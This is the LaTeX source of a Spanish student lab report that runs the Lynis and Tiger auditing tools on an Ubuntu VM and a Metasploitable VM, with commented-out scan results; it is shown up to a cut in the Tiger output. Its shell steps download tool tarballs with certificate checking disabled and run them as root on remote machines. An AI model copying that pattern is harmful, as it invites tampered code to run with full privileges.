@@ -1,0 +1,1557 @@
+\documentclass[11pt]{utalcaDoc}
+\usepackage{alltt}
+\usepackage{underscore}
+\usepackage[utf8]{inputenc}
+\usepackage[activeacute,spanish]{babel}
+\usepackage{verbatim}
+\usepackage[pdftex]{graphicx}
+\usepackage{ae}
+\usepackage{amsmath}
+\usepackage{amsfonts}
+\usepackage{pdflscape}
+\usepackage{inconsolata}
+\usepackage{url}
+\usepackage{hyperref}
+\usepackage{listings}
+% \usepackage{placeins}
+\usepackage[section]{placeins}
+\usepackage[stable]{footmisc}
+\usepackage{minted}
+\usepackage{multicol}
+
+\usepackage{csquotes}
+\title{{\bf Seguridad Informática}\\ Laboratorio 8}
+\author{Erik Regla\\ eregla09@alumnos.utalca.cl}
+\date{\today}
+
+\begin{document}
+\maketitle
+\newpage
+\tableofcontents
+\newpage
+
+\section{Actividades}
+
+Elegimos como objetivo disponible en la web la pagina principal de la universidad por motivos legales y de pruebas. Además que ya conocemos algo de información al respecto y estas herramientas no necesariamente pueden encontrar información de otras vulnerabilidades ya conocidas por la forma en la que está hecha la aplicación en si.
+
+
+\subsection{Configuración de ambiente de trabajo y trabajo inicial}
+Debido a las anteriores actividades del curso, VirtualBox (nuestro sistema de virtualizacion elegido) junto con una máquina virtual con linux ya estaban cargadas previamente. Para la instalación de metasploit solo se clonó la máquina y se cargó el disco provisto en la guia oficial.
+
+Todas las máquinas están configuradas con tres interfaces de red. NAT, bridge y host-only, de las cuales solo la bridge esta habilitada. Todos los accesos se realizan por medio de ssh. Todas las conexiones salientes están filtradas por medio de un router cargado previamente con OpenWRT. No es posible mostrar la configuración de la máquina virtual por motivos de privacidad, sin embargo, la razón de por que utilizarla será obvia mas adelante.
+
+Si bien este servicio ya estaba pre-activado para la maquina con ubuntu, este no viene activo por defecto en metasploitable.
+
+\begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{bash}
+	/etc/init.d/ssh start
+\end{minted}
+
+Por economía de espacio, no se mostrarán las salidas completas, las cuales pueden ser revisadas como documentos adjuntos a este informe.
+
+
+\subsection{Lynis}
+De acuerdo al sitio oficial(\url{https://github.com/CISOfy/Lynis}), se clona el repositorio y luego se ejecuta directamente la herramienta en nuestro host (un sistema PopOS Linux):
+
+\begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{bash}
+	sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys C80E383C3DE9F082E01391A0366C67DE91CA5D5F
+	sudo apt install apt-transport-https
+	echo 'Acquire::Languages "none";' | sudo tee /etc/apt/apt.conf.d/99disable-translations
+	echo "deb https://packages.cisofy.com/community/lynis/deb/ stable main" | sudo tee /etc/apt/sources.list.d/cisofy-lynis.list
+	sudo apt update
+	sudo apt install lynis
+	lynis audit system user@192.168.0.138
+\end{minted}
+
+Esto nos entrega los comandos para ejecutar nuestro analisis sobre la maquina ubuntu (adjunto por cierto). Sin embargo, la parte de lynis que hace caso de comprimir la version remota en realidad no comprime nada. Como fue instalado usando un paquete, esta asumiendo que estamos ejecutando la versión del tarball. Debido a esto, vamos a usar el tarball en vez de la versión sugerida. Lo mismo ocurre con la localización del reporte. Debido a esto, vamos a modificar los comandos antes de ejecutarlos. De paso guardamos la salida estándar para revisarla posteriormente.
+
+\begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{bash}
+	wget https://downloads.cisofy.com/lynis/lynis-3.0.0.tar.gz --no-check-certificate
+
+	# our ubuntu box
+	scp -q ./lynis-3.0.0.tar.gz  user@192.168.0.138:~/tmp-lynis-remote.tgz
+    ssh user@192.168.0.138 "mkdir -p ~/tmp-lynis && cd ~/tmp-lynis && tar xzf ../tmp-lynis-remote.tgz && rm ../tmp-lynis-remote.tgz && sudo -S chown -R root:root ~/tmp-lynis && cd lynis && sudo -S ./lynis audit system > /home/user/tmp-lynis/lynis-stdout.log && sudo -S chown -R user:user ~/tmp-lynis"
+    ssh user@192.168.0.138 "rm -rf ~/tmp-lynis"
+    scp -q user@192.168.0.138:/home/user/lynis.log ./user@192.168.0.138-lynis.log
+	scp -q user@192.168.0.138:/home/user/lynis-report.dat ./user@192.168.0.138-lynis-report.dat
+	scp -q user@192.168.0.138:/home/user/tmp-lynis/lynis-stdout.log ./user@192.168.0.138-lynis-stdout.log
+	ssh user@192.168.0.138 "rm /home/user/lynis.log /home/user/lynis-report.dat /home/user/tmp-lynis/lynis-stdout.log"
+	
+	# our msf box
+	scp -q ./lynis-3.0.0.tar.gz  msfadmin@192.168.0.184:~/tmp-lynis-remote.tgz
+    ssh msfadmin@192.168.0.184 "mkdir -p ~/tmp-lynis && cd ~/tmp-lynis && tar xzf ../tmp-lynis-remote.tgz && rm ../tmp-lynis-remote.tgz && sudo -S chown -R root:root ~/tmp-lynis && cd lynis && sudo -S ./lynis audit system > /home/user/tmp-lynis/lynis-stdout.log && sudo -S chown -R user:user ~/tmp-lynis"
+    ssh msfadmin@192.168.0.184 "rm -rf ~/tmp-lynis"
+    scp -q msfadmin@192.168.0.184:/home/msfadmin/lynis.log ./msfadmin@192.168.0.184-lynis.log
+    scp -q msfadmin@192.168.0.184:/home/msfadmin/lynis-report.dat ./msfadmin@192.168.0.184-lynis-report.dat
+    scp -q msfadmin@192.168.0.184:/home/user/tmp-lynis/lynis-stdout.log ./msfadmin@192.168.0.184-lynis-stdout.log
+    ssh msfadmin@192.168.0.184 "rm /home/msfadmin/lynis.log /home/msfadmin/lynis-report.dat /home/user/tmp-lynis/lynis-stdout.log"
+\end{minted}
+
+% Habiendo ejecutado las pruebas, para la instancia de ubuntu tenemos el siguiente informe: 
+
+% \begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{text}
+% 	================================================================================
+
+% 	-[ Lynis 3.0.0 Results ]-
+  
+% 	Warnings (1):
+% 	----------------------------
+% 	! Reboot of system is most likely needed [KRNL-5830] 
+% 	  - Solution : reboot
+% 		https://cisofy.com/lynis/controls/KRNL-5830/
+  
+% 	Suggestions (40):
+% 	----------------------------
+% 	* Set a password on GRUB boot loader to prevent altering boot configuration (e.g. boot in single user mode without password) [BOOT-5122] 
+% 		https://cisofy.com/lynis/controls/BOOT-5122/
+  
+% 	* Consider hardening system services [BOOT-5264] 
+% 	  - Details  : Run '/usr/bin/systemd-analyze security SERVICE' for each service
+% 		https://cisofy.com/lynis/controls/BOOT-5264/
+  
+% 	* If not required, consider explicit disabling of core dump in /etc/security/limits.conf file [KRNL-5820] 
+% 		https://cisofy.com/lynis/controls/KRNL-5820/
+  
+% 	* Run pwck manually and correct any errors in the password file [AUTH-9228] 
+% 		https://cisofy.com/lynis/controls/AUTH-9228/
+  
+% 	* Configure minimum encryption algorithm rounds in /etc/login.defs [AUTH-9230] 
+% 		https://cisofy.com/lynis/controls/AUTH-9230/
+  
+% 	* Configure maximum encryption algorithm rounds in /etc/login.defs [AUTH-9230] 
+% 		https://cisofy.com/lynis/controls/AUTH-9230/
+  
+% 	* Install a PAM module for password strength testing like pam_cracklib or pam_passwdqc [AUTH-9262] 
+% 		https://cisofy.com/lynis/controls/AUTH-9262/
+  
+% 	* Configure minimum password age in /etc/login.defs [AUTH-9286] 
+% 		https://cisofy.com/lynis/controls/AUTH-9286/
+  
+% 	* Configure maximum password age in /etc/login.defs [AUTH-9286] 
+% 		https://cisofy.com/lynis/controls/AUTH-9286/
+  
+% 	* Default umask in /etc/login.defs could be more strict like 027 [AUTH-9328] 
+% 		https://cisofy.com/lynis/controls/AUTH-9328/
+  
+% 	* To decrease the impact of a full /home file system, place /home on a separate partition [FILE-6310] 
+% 		https://cisofy.com/lynis/controls/FILE-6310/
+  
+% 	* To decrease the impact of a full /tmp file system, place /tmp on a separate partition [FILE-6310] 
+% 		https://cisofy.com/lynis/controls/FILE-6310/
+  
+% 	* To decrease the impact of a full /var file system, place /var on a separate partition [FILE-6310] 
+% 		https://cisofy.com/lynis/controls/FILE-6310/
+  
+% 	* Consider disabling unused kernel modules [FILE-6430] 
+% 	  - Details  : /etc/modprobe.d/blacklist.conf
+% 	  - Solution : Add 'install MODULENAME /bin/true' (without quotes)
+% 		https://cisofy.com/lynis/controls/FILE-6430/
+  
+% 	* Disable drivers like USB storage when not used, to prevent unauthorized storage or data theft [USB-1000] 
+% 		https://cisofy.com/lynis/controls/USB-1000/
+  
+% 	* Check DNS configuration for the dns domain name [NAME-4028] 
+% 		https://cisofy.com/lynis/controls/NAME-4028/
+  
+% 	* Install debsums utility for the verification of packages with known good database. [PKGS-7370] 
+% 		https://cisofy.com/lynis/controls/PKGS-7370/
+  
+% 	* Install package apt-show-versions for patch management purposes [PKGS-7394] 
+% 		https://cisofy.com/lynis/controls/PKGS-7394/
+  
+% 	* Install a package audit tool to determine vulnerable packages [PKGS-7398] 
+% 		https://cisofy.com/lynis/controls/PKGS-7398/
+  
+% 	* Determine if protocol 'dccp' is really needed on this system [NETW-3200] 
+% 		https://cisofy.com/lynis/controls/NETW-3200/
+  
+% 	* Determine if protocol 'sctp' is really needed on this system [NETW-3200] 
+% 		https://cisofy.com/lynis/controls/NETW-3200/
+  
+% 	* Determine if protocol 'rds' is really needed on this system [NETW-3200] 
+% 		https://cisofy.com/lynis/controls/NETW-3200/
+  
+% 	* Determine if protocol 'tipc' is really needed on this system [NETW-3200] 
+% 		https://cisofy.com/lynis/controls/NETW-3200/
+  
+% 	* Access to CUPS configuration could be more strict. [PRNT-2307] 
+% 		https://cisofy.com/lynis/controls/PRNT-2307/
+  
+% 	* Check CUPS configuration if it really needs to listen on the network [PRNT-2308] 
+% 		https://cisofy.com/lynis/controls/PRNT-2308/
+  
+% 	* Enable logging to an external logging host for archiving purposes and additional protection [LOGG-2154] 
+% 		https://cisofy.com/lynis/controls/LOGG-2154/
+  
+% 	* Check what deleted files are still in use and why. [LOGG-2190] 
+% 		https://cisofy.com/lynis/controls/LOGG-2190/
+  
+% 	* Add a legal banner to /etc/issue, to warn unauthorized users [BANN-7126] 
+% 		https://cisofy.com/lynis/controls/BANN-7126/
+  
+% 	* Add legal banner to /etc/issue.net, to warn unauthorized users [BANN-7130] 
+% 		https://cisofy.com/lynis/controls/BANN-7130/
+  
+% 	* Enable process accounting [ACCT-9622] 
+% 		https://cisofy.com/lynis/controls/ACCT-9622/
+  
+% 	* Enable sysstat to collect accounting (no results) [ACCT-9626] 
+% 		https://cisofy.com/lynis/controls/ACCT-9626/
+  
+% 	* Enable auditd to collect audit information [ACCT-9628] 
+% 		https://cisofy.com/lynis/controls/ACCT-9628/
+  
+% 	* Utilize software pseudo random number generators [CRYP-8005] 
+% 		https://cisofy.com/lynis/controls/CRYP-8005/
+  
+% 	* Check output of aa-status [MACF-6208] 
+% 	  - Details  : /sys/kernel/security/apparmor/profiles
+% 	  - Solution : Run aa-status
+% 		https://cisofy.com/lynis/controls/MACF-6208/
+  
+% 	* Install a file integrity tool to monitor changes to critical and sensitive files [FINT-4350] 
+% 		https://cisofy.com/lynis/controls/FINT-4350/
+  
+% 	* Determine if automation tools are present for system management [TOOL-5002] 
+% 		https://cisofy.com/lynis/controls/TOOL-5002/
+  
+% 	* Consider restricting file permissions [FILE-7524] 
+% 	  - Details  : See screen output or log file
+% 	  - Solution : Use chmod to change file permissions
+% 		https://cisofy.com/lynis/controls/FILE-7524/
+  
+% 	* Double check the permissions of home directories as some might be not strict enough. [HOME-9304] 
+% 		https://cisofy.com/lynis/controls/HOME-9304/
+  
+% 	* One or more sysctl values differ from the scan profile and could be tweaked [KRNL-6000] 
+% 	  - Solution : Change sysctl value or disable test (skip-test=KRNL-6000:<sysctl-key>)
+% 		https://cisofy.com/lynis/controls/KRNL-6000/
+  
+% 	* Harden the system by installing at least one malware scanner, to perform periodic file system scans [HRDN-7230] 
+% 	  - Solution : Install a tool like rkhunter, chkrootkit, OSSEC
+% 		https://cisofy.com/lynis/controls/HRDN-7230/
+  
+% 	Follow-up:
+% 	----------------------------
+% 	- Show details of a test (lynis show details TEST-ID)
+% 	- Check the logfile for all details (less /home/user/lynis.log)
+% 	- Read security controls texts (https://cisofy.com)
+% 	- Use --upload to upload data to central system (Lynis Enterprise users)
+  
+%   ================================================================================
+  
+% 	Lynis security scan details:
+  
+% 	Hardening index : 60 [############        ]
+% 	Tests performed : 222
+% 	Plugins enabled : 0
+  
+% 	Components:
+% 	- Firewall               [V]
+% 	- Malware scanner        [X]
+  
+% 	Scan mode:
+% 	Normal [ ]  Forensics [ ]  Integration [ ]  Pentest [V] (running non-privileged)
+  
+% 	Lynis modules:
+% 	- Compliance status      [?]
+% 	- Security audit         [V]
+% 	- Vulnerability scan     [V]
+  
+% 	Files:
+% 	- Test and debug information      : /home/user/lynis.log
+% 	- Report data                     : /home/user/lynis-report.dat
+  
+%   ================================================================================
+  
+% 	Skipped tests due to non-privileged mode
+% 	  BOOT-5108 - Check Syslinux as bootloader
+% 	  BOOT-5109 - Check rEFInd as bootloader
+% 	  BOOT-5116 - Check if system is booted in UEFI mode
+% 	  AUTH-9216 - Check group and shadow group files
+% 	  AUTH-9229 - Check password hashing methods
+% 	  AUTH-9252 - Check ownership and permissions for sudo configuration files
+% 	  AUTH-9288 - Checking for expired passwords
+% 	  FILE-6368 - Checking ACL support on root file system
+% 	  PKGS-7390 - Check Ubuntu database consistency
+% 	  PKGS-7392 - Check for Debian/Ubuntu security updates
+% 	  FIRE-4508 - Check used policies of iptables chains
+% 	  FIRE-4512 - Check iptables for empty ruleset
+% 	  FIRE-4513 - Check iptables for unused rules
+% 	  FIRE-4586 - Check firewall logging
+% 	  CRYP-7930 - Determine if system uses LUKS block device encryption
+  
+%   ================================================================================
+% \end{minted}
+
+% Habiendo ejecutado las pruebas, para la instancia de metasploitable tenemos el siguiente informe: 
+
+% \begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{text}
+% 	================================================================================
+
+%   -[ Lynis 3.0.0 Results ]-
+
+%   Warnings (3):
+%   ----------------------------
+%   ! Found BIND version in banner [NAME-4210] 
+%       https://cisofy.com/lynis/controls/NAME-4210/
+
+%   ! Couldn't find 2 responsive nameservers [NETW-2705] 
+%       https://cisofy.com/lynis/controls/NETW-2705/
+
+%   ! Found some information disclosure in SMTP banner (OS or software name) [MAIL-8818] 
+%       https://cisofy.com/lynis/controls/MAIL-8818/
+
+%   Suggestions (51):
+%   ----------------------------
+%   * Set a password on GRUB boot loader to prevent altering boot configuration (e.g. boot in single user mode without password) [BOOT-5122] 
+%       https://cisofy.com/lynis/controls/BOOT-5122/
+
+%   * If not required, consider explicit disabling of core dump in /etc/security/limits.conf file [KRNL-5820] 
+%       https://cisofy.com/lynis/controls/KRNL-5820/
+
+%   * Run pwck manually and correct any errors in the password file [AUTH-9228] 
+%       https://cisofy.com/lynis/controls/AUTH-9228/
+
+%   * To decrease the impact of a full /home file system, place /home on a separate partition [FILE-6310] 
+%       https://cisofy.com/lynis/controls/FILE-6310/
+
+%   * To decrease the impact of a full /tmp file system, place /tmp on a separate partition [FILE-6310] 
+%       https://cisofy.com/lynis/controls/FILE-6310/
+
+%   * To decrease the impact of a full /var file system, place /var on a separate partition [FILE-6310] 
+%       https://cisofy.com/lynis/controls/FILE-6310/
+
+%   * Consider disabling unused kernel modules [FILE-6430] 
+%     - Details  : /etc/modprobe.d/blacklist.conf
+%     - Solution : Add 'install MODULENAME /bin/true' (without quotes)
+%       https://cisofy.com/lynis/controls/FILE-6430/
+
+%   * Disable drivers like USB storage when not used, to prevent unauthorized storage or data theft [USB-1000] 
+%       https://cisofy.com/lynis/controls/USB-1000/
+
+%   * Disable drivers like firewire storage when not used, to prevent unauthorized storage or data theft [STRG-1846] 
+%       https://cisofy.com/lynis/controls/STRG-1846/
+
+%   * Specify clients that are allowed to access a NFS share /etc/exports [STRG-1930] 
+%       https://cisofy.com/lynis/controls/STRG-1930/
+
+%   * The version in BIND can be masked by defining 'version none' in the configuration file [NAME-4210] 
+%       https://cisofy.com/lynis/controls/NAME-4210/
+
+%   * Purge old/removed packages (3 found) with aptitude purge or dpkg --purge command. This will cleanup old configuration files, cron jobs and startup scripts. [PKGS-7346] 
+%       https://cisofy.com/lynis/controls/PKGS-7346/
+
+%   * Install debsums utility for the verification of packages with known good database. [PKGS-7370] 
+%       https://cisofy.com/lynis/controls/PKGS-7370/
+
+%   * Install package apt-show-versions for patch management purposes [PKGS-7394] 
+%       https://cisofy.com/lynis/controls/PKGS-7394/
+
+%   * Install a package audit tool to determine vulnerable packages [PKGS-7398] 
+%       https://cisofy.com/lynis/controls/PKGS-7398/
+
+%   * Consider using a tool to automatically apply upgrades [PKGS-7420] 
+%       https://cisofy.com/lynis/controls/PKGS-7420/
+
+%   * Check your resolv.conf file and fill in a backup nameserver if possible [NETW-2705] 
+%       https://cisofy.com/lynis/controls/NETW-2705/
+
+%   * Determine if protocol 'dccp' is really needed on this system [NETW-3200] 
+%       https://cisofy.com/lynis/controls/NETW-3200/
+
+%   * Determine if protocol 'sctp' is really needed on this system [NETW-3200] 
+%       https://cisofy.com/lynis/controls/NETW-3200/
+
+%   * Determine if protocol 'rds' is really needed on this system [NETW-3200] 
+%       https://cisofy.com/lynis/controls/NETW-3200/
+
+%   * Determine if protocol 'tipc' is really needed on this system [NETW-3200] 
+%       https://cisofy.com/lynis/controls/NETW-3200/
+
+%   * You are advised to hide the mail_name (option: smtpd_banner) from your postfix configuration. Use postconf -e or change your main.cf file (/etc/postfix/main.cf) [MAIL-8818] 
+%       https://cisofy.com/lynis/controls/MAIL-8818/
+
+%   * Disable the 'VRFY' command [MAIL-8820:disable_vrfy_command] 
+%     - Details  : disable_vrfy_command=no
+%     - Solution : run postconf -e disable_vrfy_command=yes to change the value
+%       https://cisofy.com/lynis/controls/MAIL-8820/
+
+%   * Install Apache mod_evasive to guard webserver against DoS/brute force attempts [HTTP-6640] 
+%       https://cisofy.com/lynis/controls/HTTP-6640/
+
+%   * Install Apache mod_reqtimeout or mod_qos to guard webserver against Slowloris attacks [HTTP-6641] 
+%       https://cisofy.com/lynis/controls/HTTP-6641/
+
+%   * Install Apache modsecurity to guard webserver against web application attacks [HTTP-6643] 
+%       https://cisofy.com/lynis/controls/HTTP-6643/
+
+%   * Turn off PHP information exposure [PHP-2372] 
+%     - Details  : expose_php = Off
+%       https://cisofy.com/lynis/controls/PHP-2372/
+
+%   * Change the allow_url_fopen line to: allow_url_fopen = Off, to disable downloads via PHP [PHP-2376] 
+%       https://cisofy.com/lynis/controls/PHP-2376/
+
+%   * Enable logging to an external logging host for archiving purposes and additional protection [LOGG-2154] 
+%       https://cisofy.com/lynis/controls/LOGG-2154/
+
+%   * Although inetd is not running, make sure no services are enabled in /etc/inetd.conf, or remove inetd service [INSE-8006] 
+%       https://cisofy.com/lynis/controls/INSE-8006/
+
+%   * If there are no xinetd services required, it is recommended that the daemon be removed [INSE-8100] 
+%       https://cisofy.com/lynis/controls/INSE-8100/
+
+%   * Remove rsh client when it is not in use or replace with the more secure SSH package [INSE-8300] 
+%       https://cisofy.com/lynis/controls/INSE-8300/
+
+%   * Remove the rsh-server package and replace with a more secure alternative like SSH [INSE-8304] 
+%       https://cisofy.com/lynis/controls/INSE-8304/
+
+%   * Removing the 1 package and replace with SSH when possible [INSE-8322] 
+%       https://cisofy.com/lynis/controls/INSE-8322/
+
+%   * Removing the tftpd package decreases the risk of the accidental (or intentional) activation of tftp services [INSE-8320] 
+%       https://cisofy.com/lynis/controls/INSE-8320/
+
+%   * Add a legal banner to /etc/issue, to warn unauthorized users [BANN-7126] 
+%       https://cisofy.com/lynis/controls/BANN-7126/
+
+%   * Add legal banner to /etc/issue.net, to warn unauthorized users [BANN-7130] 
+%       https://cisofy.com/lynis/controls/BANN-7130/
+
+%   * Enable process accounting [ACCT-9622] 
+%       https://cisofy.com/lynis/controls/ACCT-9622/
+
+%   * Enable sysstat to collect accounting (no results) [ACCT-9626] 
+%       https://cisofy.com/lynis/controls/ACCT-9626/
+
+%   * Enable auditd to collect audit information [ACCT-9628] 
+%       https://cisofy.com/lynis/controls/ACCT-9628/
+
+%   * Check available certificates for expiration [CRYP-7902] 
+%       https://cisofy.com/lynis/controls/CRYP-7902/
+
+%   * Utilize software pseudo random number generators [CRYP-8005] 
+%       https://cisofy.com/lynis/controls/CRYP-8005/
+
+%   * Check output of aa-status [MACF-6208] 
+%     - Details  : /sys/kernel/security/apparmor/profiles
+%     - Solution : Run aa-status
+%       https://cisofy.com/lynis/controls/MACF-6208/
+
+%   * Install a file integrity tool to monitor changes to critical and sensitive files [FINT-4350] 
+%       https://cisofy.com/lynis/controls/FINT-4350/
+
+%   * Determine if automation tools are present for system management [TOOL-5002] 
+%       https://cisofy.com/lynis/controls/TOOL-5002/
+
+%   * Consider restricting file permissions [FILE-7524] 
+%     - Details  : See screen output or log file
+%     - Solution : Use chmod to change file permissions
+%       https://cisofy.com/lynis/controls/FILE-7524/
+
+%   * Double check the permissions of home directories as some might be not strict enough. [HOME-9304] 
+%       https://cisofy.com/lynis/controls/HOME-9304/
+
+%   * Double check the ownership of home directories as some might be incorrect. [HOME-9306] 
+%       https://cisofy.com/lynis/controls/HOME-9306/
+
+%   * One or more sysctl values differ from the scan profile and could be tweaked [KRNL-6000] 
+%     - Solution : Change sysctl value or disable test (skip-test=KRNL-6000:<sysctl-key>)
+%       https://cisofy.com/lynis/controls/KRNL-6000/
+
+%   * Harden compilers like restricting access to root user only [HRDN-7222] 
+%       https://cisofy.com/lynis/controls/HRDN-7222/
+
+%   * Harden the system by installing at least one malware scanner, to perform periodic file system scans [HRDN-7230] 
+%     - Solution : Install a tool like rkhunter, chkrootkit, OSSEC
+%       https://cisofy.com/lynis/controls/HRDN-7230/
+
+%   Follow-up:
+%   ----------------------------
+%   - Show details of a test (lynis show details TEST-ID)
+%   - Check the logfile for all details (less /home/msfadmin/lynis.log)
+%   - Read security controls texts (https://cisofy.com)
+%   - Use --upload to upload data to central system (Lynis Enterprise users)
+
+% ================================================================================
+
+%   Lynis security scan details:
+
+%   Hardening index : 61 [############        ]
+%   Tests performed : 232
+%   Plugins enabled : 0
+
+%   Components:
+%   - Firewall               [V]
+%   - Malware scanner        [X]
+
+%   Scan mode:
+%   Normal [ ]  Forensics [ ]  Integration [ ]  Pentest [V] (running non-privileged)
+
+%   Lynis modules:
+%   - Compliance status      [?]
+%   - Security audit         [V]
+%   - Vulnerability scan     [V]
+
+%   Files:
+%   - Test and debug information      : /home/msfadmin/lynis.log
+%   - Report data                     : /home/msfadmin/lynis-report.dat
+
+% ================================================================================
+
+%   Exceptions found
+%   Some exceptional events or information was found!
+
+%   What to do:
+%   You can help by providing your log file (/home/msfadmin/lynis.log).
+%   Go to https://cisofy.com/contact/ and send your file to the e-mail address listed
+
+% ================================================================================
+
+%   Skipped tests due to non-privileged mode
+%     BOOT-5108 - Check Syslinux as bootloader
+%     BOOT-5109 - Check rEFInd as bootloader
+%     BOOT-5116 - Check if system is booted in UEFI mode
+%     AUTH-9216 - Check group and shadow group files
+%     AUTH-9229 - Check password hashing methods
+%     FILE-6368 - Checking ACL support on root file system
+%     PKGS-7390 - Check Ubuntu database consistency
+%     PKGS-7392 - Check for Debian/Ubuntu security updates
+%     FIRE-4508 - Check used policies of iptables chains
+%     FIRE-4512 - Check iptables for empty ruleset
+%     FIRE-4513 - Check iptables for unused rules
+%     FIRE-4586 - Check firewall logging
+%     CRYP-7930 - Determine if system uses LUKS block device encryption
+
+% ================================================================================
+% \end{minted}
+
+Al ejecutar un diff entre las salidas de ambos archivos y sus logs, podemos identificar que si bien ambos sistemas tienen un numero importante de sugerencias a implementar, en el caso de la máquina con ubuntu, estas no parecen tener mayor importancia de el disclosure de información, ocultar banners y similares. Por otro lado, para metasploitable son servicios que están expuestos como tftp, rsh, paquetes de ssh vulnerables, etc.
+
+
+Si bien el enunciado indica que esta prueba es la única que hay que ejecutar en ambas máquinas, no nos va a entregar información suficiente para una comparación real. Es más, esa sugerencia es tanto poco profesional como realista, por tanto, repetiremos las pruebas para ambas máquinas en contra de los preceptos del enunciado.
+
+
+\subsection{Tiger}
+
+De similar manera al caso anterior, vamos a usar la línea de comandos para cargar tiger y obtener las pruebas.
+
+\begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{bash}
+	wget https://download.savannah.gnu.org/releases/tiger/tiger_3.2.4rc1.tar.gz --no-check-certificate
+
+	# for ubuntu
+	scp -q ./tiger_3.2.4rc1.tar.gz  user@192.168.0.138:~/tmp-tiger-remote.tgz 
+	ssh user@192.168.0.138 "sudo -S rm -rfv ~/tmp-tiger && mkdir -p ~/tmp-tiger && cd ~/tmp-tiger && tar xzf ../tmp-tiger-remote.tgz && rm ../tmp-tiger-remote.tgz && cd tiger-3.2.4rc1 && mkdir -p log && sudo -S chown -R root:root . &&  sudo -S ./tiger && sudo -S chown -R user:user ."
+	scp -r -q user@192.168.0.138:/home/user/tmp-tiger/tiger-3.2.4rc1/log ./tiger_log_user@192.168.0.138
+
+	# for msf
+	scp -q ./tiger_3.2.4rc1.tar.gz  msfadmin@192.168.0.184:~/tmp-tiger-remote.tgz 
+	ssh msfadmin@192.168.0.184 "sudo -S rm -rfv ~/tmp-tiger && mkdir -p ~/tmp-tiger && cd ~/tmp-tiger && tar xzf ../tmp-tiger-remote.tgz && rm ../tmp-tiger-remote.tgz && cd tiger-3.2.4rc1 && mkdir -p log && sudo -S chown -R root:root . &&  sudo -S ./tiger && sudo -S chown -R msfadmin:msfadmin ."
+	scp -r -q msfadmin@192.168.0.184:/home/msfadmin/tmp-tiger/tiger-3.2.4rc1/log ./tiger_log_msfadmin@192.168.0.184
+\end{minted}
+
+% En este caso tenemos los siguientes resultados para nuestra máquina con ubuntu:
+
+
+% \begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{tex}
+% 	Security scripts *** 3.2.4rc1, 2018.02.10.20.30 ***
+% 	Sat Aug  1 21:13:05 EDT 2020
+% 	21:13> Beginning security report for user-VirtualBox (x86_64 Linux 5.4.0-26-generic).
+	
+% 	# Performing check of passwd files...
+% 	# Checking entries from /etc/passwd.
+% 	--WARN-- [pass013w] Username `root' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `daemon' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `bin' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `sys' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `sync' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass015w] Login ID sync does not have a valid shell (/bin/sync). 
+% 	--WARN-- [pass013w] Username `games' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `man' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `lp' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `mail' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `news' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `uucp' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `proxy' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `www-data' is not using an acceptable password 
+% 			 hash (x). 
+% 	--WARN-- [pass013w] Username `backup' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `list' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `irc' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `gnats' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `nobody' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `systemd-network' is not using an acceptable 
+% 			 password hash (x). 
+% 	--WARN-- [pass013w] Username `systemd-resolve' is not using an acceptable 
+% 			 password hash (x). 
+% 	--WARN-- [pass013w] Username `systemd-timesync' is not using an acceptable 
+% 			 password hash (x). 
+% 	--WARN-- [pass013w] Username `messagebus' is not using an acceptable password 
+% 			 hash (x). 
+% 	--WARN-- [pass013w] Username `syslog' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `_apt' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `tss' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `uuidd' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `tcpdump' is not using an acceptable password 
+% 			 hash (x). 
+% 	--WARN-- [pass013w] Username `avahi-autoipd' is not using an acceptable 
+% 			 password hash (x). 
+% 	--WARN-- [pass013w] Username `usbmux' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `rtkit' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `dnsmasq' is not using an acceptable password 
+% 			 hash (x). 
+% 	--WARN-- [pass013w] Username `cups-pk-helper' is not using an acceptable 
+% 			 password hash (x). 
+% 	--WARN-- [pass013w] Username `lightdm' is not using an acceptable password 
+% 			 hash (x). 
+% 	--WARN-- [pass013w] Username `speech-dispatcher' is not using an acceptable 
+% 			 password hash (x). 
+% 	--WARN-- [pass013w] Username `avahi' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `kernoops' is not using an acceptable password 
+% 			 hash (x). 
+% 	--WARN-- [pass016w] User kernoops has / as home directory 
+% 	--WARN-- [pass013w] Username `saned' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `hplip' is not using an acceptable password hash 
+% 			 (x). 
+% 	--WARN-- [pass013w] Username `whoopsie' is not using an acceptable password 
